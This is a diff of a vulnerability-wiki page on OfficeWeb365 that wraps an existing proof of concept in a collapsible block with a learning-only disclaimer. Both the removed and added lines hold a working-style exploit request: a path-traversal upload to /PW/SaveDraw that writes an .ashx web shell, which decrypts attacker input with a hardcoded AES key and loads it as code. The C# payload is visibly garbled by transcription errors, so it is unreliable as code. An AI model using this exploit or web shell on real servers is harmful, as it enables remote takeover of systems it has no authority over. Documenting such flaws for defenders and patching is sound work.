@@ -33,8 +33,10 @@ OfficeWeb365
 
 验证POC
 
-```
-POST /PW/SaveDraw?path=../../Content/img&idx=6.ashx HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /PW/SaveDraw?path=../../Content/img&amp;idx=6.ashx HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36
 Content-Length: 990
@@ -42,8 +44,9 @@ Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip, deflate
 Connection: close
 
-data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.I0;using System.Reflection;using System.Text;using System.Web;using System.WebSessionState;using&System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void=&ProcessRequest(HttpContext context){try{string key="900bc885d7553375";byteDk=&Encoding.Default.GetBytes(key);context.Session.AddC"sky", key);StreamReader sr=new&StreamReader(contextRequest.InputStream);string line=sr.ReadLine;if(!string.IsNullOrEmpty(line)){byteDc=&Convert.FromBase64String(line);Assembly assembly=&typeof(Environment).Assembly;RijndaelManaged rm=(RijndaelManaged)&assembly.CreateInstance("System.Secur"+"ityCrypto"+"graphy.Rijnda"+"elm anaged");byte[ data=rm.CreateDecryptorCk,k)TransformFinalBlock(c,0, c.Length);Assembly.Load(data)CreateInstance("U").Equals(context);sr.clo se();}}catch {}}public bool IsReusable{get{return false;}}}}---
-```
+data:image/png;base64,01s34567890123456789y12345678901234567m91&lt;%@ WebHandler Language="C#" Class="Handler" %&gt;using System;using System.I0;using System.Reflection;using System.Text;using System.Web;using System.WebSessionState;using&amp;System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void=&amp;ProcessRequest(HttpContext context){try{string key="900bc885d7553375";byteDk=&amp;Encoding.Default.GetBytes(key);context.Session.AddC"sky", key);StreamReader sr=new&amp;StreamReader(contextRequest.InputStream);string line=sr.ReadLine;if(!string.IsNullOrEmpty(line)){byteDc=&amp;Convert.&#70;romBase64String(line);Assembly assembly=&amp;typeof(Environment).Assembly;RijndaelManaged rm=(RijndaelManaged)&amp;assembly.CreateInstance("System.Secur"+"ityCrypto"+"graphy.Rijnda"+"elm anaged");byte[ data=rm.CreateDecryptorCk,k)TransformFinalBlock(c,0, c.Length);Assembly.Load(data)CreateInstance("U").Equals(context);sr.clo se();}}catch {}}public bool IsReusable{get{return false;}}}}---</code></pre>
+
+</details>
 
 ![image-20230828143155818](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828143155818.png)
 
